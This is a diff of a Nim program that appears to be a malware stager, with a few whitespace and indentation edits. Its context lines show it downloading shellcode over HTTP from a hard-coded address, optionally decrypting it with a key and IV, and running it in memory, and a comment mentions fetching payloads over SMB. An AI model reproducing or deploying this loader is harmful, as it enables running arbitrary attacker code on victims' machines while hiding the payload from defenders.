@@ -88,7 +88,9 @@ when isMainModule:
             var url = 
             "http://10.90.248.103:80/test.bin"
             var response: string = client.getContent(url) 
+            
             shellcode = toByteSeq(response)                 
+            
             runShellcode(shellcode) 
 
         #Download the payload over http
@@ -105,7 +107,7 @@ when isMainModule:
                     actual.add(shellcode[i])
             
             shellcode = 
-                decrypt(actual,key,iv)                   
+            decrypt(actual,key,iv)                   
             runShellcode(shellcode)      
         
         #Download the payload over smb  
